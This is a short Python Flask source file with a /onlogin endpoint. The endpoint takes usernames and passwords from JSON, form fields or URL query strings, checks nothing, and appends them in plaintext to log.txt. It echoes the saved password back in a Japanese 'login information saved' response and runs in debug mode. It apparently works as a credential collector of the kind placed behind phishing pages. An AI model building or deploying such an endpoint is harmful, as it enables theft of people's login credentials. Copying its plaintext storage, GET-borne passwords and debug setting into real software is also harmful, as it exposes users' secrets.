from flask import Flask, request, jsonify
import html
from datetime import datetime
import pytz

app = Flask(__name__)

def get_credentials():
    username = ''
    password = ''

    if request.method == 'POST':
        if request.is_json:
            data = request.get_json()
            username = html.escape(data.get('username', ''))
            password = html.escape(data.get('password', ''))
        elif request.form:
            username = html.escape(request.form.get('username', ''))
            password = html.escape(request.form.get('password', ''))
    elif request.method == 'GET':
        username = html.escape(request.args.get('username', ''))
        password = html.escape(request.args.get('password', ''))

    return username, password

@app.route('/onlogin', methods=['GET', 'POST'])
def handle_request():
    userid, password = get_credentials()
    print(f"userid:{userid}")

    file = 'log.txt'

    jst = pytz.timezone('Asia/Tokyo')
    date = datetime.now(jst).strftime('%Y-%m-%d %H:%M:%S')
    log = f"日時: {date}\nユーザー名: {userid}\nパスワード: {password}\n\n"

    with open(file, 'a') as f:
        f.write(log)

    return jsonify({"message": f"ログイン情報が保存されました。\n{log}"})

if __name__ == '__main__':
    app.run(debug=True)
